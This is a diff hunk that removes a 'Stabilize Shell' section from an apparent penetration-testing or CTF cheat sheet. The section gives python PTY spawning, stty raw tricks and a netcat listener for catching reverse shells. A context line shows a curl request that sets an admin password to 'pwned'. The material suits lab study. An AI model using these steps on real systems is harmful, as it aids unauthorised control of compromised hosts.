@@ -38,22 +38,3 @@ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/
 
 
 
-# Stabilize Shell
-
-```powershell
-# -----------Technique 1 (for linux)-------------
-python -c 'import pty;pty.spawn("/bin/bash")' #might need to select the python version (python,python2,python3)
-export TERM=xterm #gives us access to term commands such as 'clear'
-CTRL+Z #background the session 
-#in your own terminal:
-stty raw -echo; fg #turns of our own terminal echo, then forgrounds the process
-
-
-# ----------- Technique 2 (best for windows) ---------------
-rlwrap nc -lvnp <port>
-# This might still need this to fully stabilise the shell: 
-CTRL=Z
-stty raw -echo; fg 
-
-# ------------ Technique 3 (SOCAT) ----------------------
-https://tryhackme.com/room/introtoshells
